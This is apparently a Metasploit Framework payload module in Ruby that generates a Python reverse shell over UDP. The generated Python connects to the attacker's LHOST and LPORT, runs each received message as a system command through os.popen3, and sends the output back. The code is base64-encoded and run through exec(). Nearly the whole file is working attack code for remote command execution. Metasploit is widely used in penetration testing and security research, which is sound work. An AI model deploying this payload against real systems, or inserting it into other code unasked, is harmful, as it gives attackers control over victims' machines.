##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_udp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 397

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Command Shell, Reverse UDP (via python)',
      'Description'   => 'Creates an interactive shell via python, encodes with base64 by design. Compatible with Python 2.3.3',
      'Author'        => 'RageLtMan <rageltman[at]sempervictus>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Handler'       => Msf::Handler::ReverseUdp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'python',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd = ''
    dead = Rex::Text.rand_text_alpha(2)
    # Set up the socket
    cmd << "import socket,os\n"
    cmd << "so=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n"
    cmd << "so.connect(('#{datastore['LHOST']}',#{ datastore['LPORT']}))\n"
    # The actual IO
    cmd << "#{dead}=False\n"
    cmd << "while not #{dead}:\n"
    cmd << "\tdata=so.recv(1024)\n"
    cmd << "\tif len(data)==0:\n\t\t#{dead}=True\n"
    cmd << "\tstdin,stdout,stderr,=os.popen3(data)\n"
    cmd << "\tstdout_value=stdout.read()+stderr.read()\n"
    cmd << "\tso.send(stdout_value)\n"

    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
    cmd = "exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))"

    cmd
  end

end

